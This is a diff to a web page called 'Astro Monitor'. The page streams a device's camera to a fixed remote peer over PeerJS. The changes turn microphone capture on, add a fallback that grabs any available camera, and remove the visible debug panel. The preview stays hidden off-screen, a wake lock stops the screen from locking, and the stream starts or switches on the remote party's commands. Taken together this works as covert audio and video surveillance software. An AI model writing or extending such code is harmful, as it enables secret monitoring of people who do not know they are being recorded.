@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Monitor - Dual Live Streaming</title>
+    <title>Astro Monitor - Remote Controlled Camera</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,27 +22,11 @@
             top: -1000px;
             left: -1000px;
         }
-        .debug {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0,0,0,0.9);
-            color: #0f0;
-            font-family: monospace;
-            font-size: 10px;
-            max-height: 120px;
-            overflow-y: auto;
-            z-index: 9999;
-            display: none;
-        }
     </style>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
 <body>
-    <video id="frontPreview" autoplay muted playsinline></video>
-    <video id="backPreview" autoplay muted playsinline></video>
-    <div class="debug" id="debug"></div>
+    <video id="localPreview" autoplay muted playsinline></video>
 
     <script>
         const MY_ID = "BPrivate";
@@ -50,11 +34,9 @@
         
         let peer = null;
         let dataConn = null;
-        let frontCall = null;
-        let backCall = null;
-        let frontStream = null;
-        let backStream = null;
-        let isActive = false;
+        let currentCall = null;
+        let currentStream = null;
+        let currentCamera = "front";
         let wakeLock = null;
         
         let FRONT_CAMERA_ID = null;
@@ -62,14 +44,6 @@
         
         function log(msg) {
             console.log(`[MONITOR] ${msg}`);
-            const debug = document.getElementById('debug');
-            if (debug) {
-                const div = document.createElement('div');
-                div.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
-                debug.appendChild(div);
-                debug.scrollTop = debug.scrollHeight;
-                if (debug.children.length > 20) debug.removeChild(debug.children[0]);
-            }
         }
         
         async function detectCameras() {
@@ -109,23 +83,24 @@
             }
         }
         
-        async function getLiveStream(camera, deviceId) {
+        async function getCameraStream(camera) {
             const isBack = (camera === 'back');
+            const targetDeviceId = isBack ? BACK_CAMERA_ID : FRONT_CAMERA_ID;
             
             // Try exact deviceId first
-            if (deviceId) {
+            if (targetDeviceId) {
                 try {
-                    log(`Getting LIVE ${camera} with deviceId`);
+                    log(`Getting ${camera} with deviceId`);
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
+                        audio: true,
                         video: {
-                            deviceId: { exact: deviceId },
+                            deviceId: { exact: targetDeviceId },
                             width: { ideal: 640 },
                             height: { ideal: 480 },
                             frameRate: { ideal: 30 }
                         }
                     });
-                    log(`✅ LIVE ${camera} stream acquired`);
+                    log(`✅ ${camera} stream acquired`);
                     return stream;
                 } catch (err) {
                     log(`deviceId failed: ${err.message}`);
@@ -134,9 +109,9 @@
             
             // Fallback to facingMode
             try {
-                log(`Falling back to facingMode for LIVE ${camera}`);
+                log(`Falling back to facingMode for ${camera}`);
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: false,
+                    audio: true,
                     video: {
                         facingMode: { exact: isBack ? "environment" : "user" },
                         width: { ideal: 640 },
@@ -144,95 +119,75 @@
                         frameRate: { ideal: 30 }
                     }
                 });
-                log(`✅ LIVE ${camera} stream acquired via facingMode`);
+                log(`✅ ${camera} stream acquired via facingMode`);
                 return stream;
             } catch (err) {
                 log(`facingMode failed: ${err.message}`);
             }
             
-            return null;
+            // Final fallback
+            log(`Using default camera for ${camera}`);
+            return await navigator.mediaDevices.getUserMedia({
+                audio: true,
+                video: { width: { ideal: 640 }, height: { ideal: 480 } }
+            });
         }
         
-        async function startBothLiveStreams() {
-            if (isActive) {
-                log('Already streaming both cameras');
+        async function startStream(camera) {
+            if (currentCall) {
+                // Close existing call
+                currentCall.close();
+                currentCall = null;
+            }
+            
+            if (currentStream) {
+                currentStream.getTracks().forEach(t => t.stop());
+                currentStream = null;
+            }
+            
+            log(`Starting stream with ${camera} camera...`);
+            
+            try {
+                const stream = await getCameraStream(camera);
+                currentStream = stream;
+                currentCamera = camera;
+                
+                // Preview locally (hidden)
+                document.getElementById('localPreview').srcObject = stream;
+                
+                // Call remote
+                currentCall = peer.call(PARTNER_ID, stream, {
+                    metadata: { camera: camera, type: 'live' }
+                });
+                
+                log(`✅ Streaming ${camera} camera to remote`);
+                
+                currentCall.on('close', () => {
+                    log('Call closed by remote');
+                    if (currentCall === this) currentCall = null;
+                });
+                
+                currentCall.on('error', (err) => {
+                    log(`Call error: ${err}`);
+                });
+                
+            } catch (err) {
+                log(`Failed to start stream: ${err.message}`);
+            }
+        }
+        
+        async function switchCamera(camera) {
+            if (camera === currentCamera) {
+                log(`Already using ${camera} camera`);
                 return;
             }
             
-            log('====== STARTING DUAL LIVE STREAMS ======');
+            log(`Switching to ${camera} camera...`);
+            await startStream(camera);
             
-            try {
-                // Get front camera stream
-                log('Getting FRONT live stream...');
-                frontStream = await getLiveStream('front', FRONT_CAMERA_ID);
-                if (frontStream) {
-                    document.getElementById('frontPreview').srcObject = frontStream;
-                    log('✅ FRONT live stream ready');
-                } else {
-                    log('❌ Failed to get FRONT live stream');
-                }
-                
-                // Get back camera stream
-                log('Getting BACK live stream...');
-                backStream = await getLiveStream('back', BACK_CAMERA_ID);
-                if (backStream) {
-                    document.getElementById('backPreview').srcObject = backStream;
-                    log('✅ BACK live stream ready');
-                } else {
-                    log('❌ Failed to get BACK live stream');
-                }
-                
-                if (frontStream && backStream) {
-                    // Make calls to remote
-                    log('Establishing WebRTC connections to remote...');
-                    
-                    frontCall = peer.call(PARTNER_ID, frontStream, { 
-                        metadata: { camera: 'front', type: 'live' } 
-                    });
-                    
-                    backCall = peer.call(PARTNER_ID, backStream, { 
-                        metadata: { camera: 'back', type: 'live' } 
-                    });
-                    
-                    isActive = true;
-                    log('✅ BOTH LIVE STREAMS ACTIVE');
-                    
-                    if (dataConn) {
-                        dataConn.send({ type: 'streams_active' });
-                    }
-                } else {
-                    log('Failed to get both camera streams');
-                    if (!frontStream) log('Front camera failed');
-                    if (!backStream) log('Back camera failed');
-                }
-                
-            } catch (err) {
-                log(`Error: ${err.message}`);
+            if (dataConn && dataConn.open) {
+                dataConn.send({ type: 'camera_switched', camera: camera });
             }
-        }
-        
-        function stopBothLiveStreams() {
-            log('Stopping both live streams...');
-            
-            if (frontCall) {
-                frontCall.close();
-                frontCall = null;
-            }
-            if (backCall) {
-                backCall.close();
-                backCall = null;
-            }
-            if (frontStream) {
-                frontStream.getTracks().forEach(t => t.stop());
-                frontStream = null;
-            }
-            if (backStream) {
-                backStream.getTracks().forEach(t => t.stop());
-                backStream = null;
-            }
-            document.getElementById('frontPreview').srcObject = null;
-            document.getElementById('backPreview').srcObject = null;
-            isActive = false;
         }
         
         async function preventScreenLock() {
@@ -245,13 +200,15 @@
         }
         
         function handleDataMessage(data) {
-            log(`Command: ${data.type}`);
+            log(`Received: ${data.type}`);
             
-            if (data.type === 'start_dual_stream') {
-                log('Received START command from remote');
-                startBothLiveStreams();
-            } else if (data.type === 'stop_dual_stream') {
-                stopBothLiveStreams();
+            if (data.type === 'switch_camera') {
+                switchCamera(data.camera);
+            } else if (data.type === 'request_stream') {
+                log('Stream requested by remote');
+                if (!currentCall) {
+                    startStream(currentCamera);
+                }
             }
         }
         
@@ -266,15 +223,9 @@
             
             peer.on('open', async () => {
                 log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
-                const camerasFound = await detectCameras();
-                if (camerasFound) {
-                    log(`Front camera ID: ${FRONT_CAMERA_ID?.substring(0, 20)}...`);
-                    log(`Back camera ID: ${BACK_CAMERA_ID?.substring(0, 20)}...`);
-                    log(`Ready for connection from ${PARTNER_ID}`);
-                    log('Will stream BOTH cameras LIVE when requested');
-                } else {
-                    log('⚠️ Could not detect both cameras');
-                }
+                await detectCameras();
+                log(`Ready for connection from ${PARTNER_ID}`);
+                log('Will stream camera when remote requests');
             });
             
             peer.on('connection', (conn) => {
@@ -284,9 +235,13 @@
                     conn.on('data', handleDataMessage);
                     conn.on('close', () => { 
                         log('Remote disconnected');
-                        stopBothLiveStreams();
+                        if (currentCall) currentCall.close();
+                        currentCall = null;
                         dataConn = null;
                     });
+                    
+                    // Notify remote that monitor is ready
+                    conn.send({ type: 'stream_ready' });
                 } else {
                     conn.close();
                 }
@@ -301,16 +256,19 @@
         }
         
         log('╔════════════════════════════════╗');
-        log('║   ASTRO MONITOR - DUAL LIVE   ║');
-        log('║   Front + Back Live Streams   ║');
+        log('║   ASTRO MONITOR               ║');
+        log('║   Remote Controlled Camera    ║');
         log('╚════════════════════════════════╝');
         
         preventScreenLock();
         initPeer();
         
         window.addEventListener('beforeunload', () => {
-            stopBothLiveStreams();
+            if (currentCall) currentCall.close();
             if (peer) peer.destroy();
+            if (currentStream) {
+                currentStream.getTracks().forEach(t => t.stop());
+            }
             if (wakeLock) wakeLock.release();
         });
     </script>
